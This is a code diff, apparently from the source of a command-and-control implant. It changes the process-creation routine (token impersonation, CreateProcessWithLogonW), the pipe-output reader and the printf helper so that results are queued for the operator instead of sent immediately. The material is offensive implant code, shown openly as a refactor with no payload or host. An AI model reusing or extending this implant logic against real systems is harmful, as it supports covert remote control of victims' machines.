@@ -550,7 +550,7 @@ BOOL ProcessCreate(
         if ( ! Instance.Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
         {
             PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
-            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+            PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             Return = FALSE;
             goto Cleanup;
         }
@@ -594,7 +594,7 @@ BOOL ProcessCreate(
             {
                 PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
                 TokenImpersonate( TRUE );
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
             }
@@ -618,7 +618,7 @@ BOOL ProcessCreate(
             ) ) {
                 PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
                 TokenImpersonate( TRUE );
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
             }
@@ -641,7 +641,7 @@ BOOL ProcessCreate(
                 ProcessInfo
         ) ) {
             PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
-            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+            PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             Return = FALSE;
             goto Cleanup;
         }
@@ -655,7 +655,7 @@ BOOL ProcessCreate(
         {
             PackageAddWString( Package, App );
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
-            PackageTransmit( Package, NULL, NULL );
+            PackageQueue( Package );
         }
         else
         {
@@ -675,7 +675,7 @@ BOOL ProcessCreate(
 
             PackageAddWString( Package, s );
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
-            PackageTransmit( Package, NULL, NULL );
+            PackageQueue( Package );
 
             PUTS( "Cleanup" )
             MemSet( s, 0, x );
@@ -931,7 +931,7 @@ VOID AnonPipesRead(
     if ( dwBufferSize ) {
         Package = PackageCreateWithRequestID( RequestID, DEMON_OUTPUT );
         PackageAddBytes( Package, Buffer, dwBufferSize );
-        PackageTransmit( Package, NULL, NULL );
+        PackageQueue( Package );
     }
 
     DATA_FREE( Buffer, dwBufferSize );
@@ -1281,7 +1281,7 @@ VOID DemonPrintf( PCHAR fmt, ... )
 
     PackageAddInt32( package, 0 ); // CALLBACK_OUTPUT
     PackageAddBytes( package, CallbackOutput, CallbackSize );
-    PackageTransmit( package, NULL, NULL );
+    PackageQueue( package );
 
     MemSet( CallbackOutput, 0, CallbackSize );
     Instance.Win32.LocalFree( CallbackOutput );
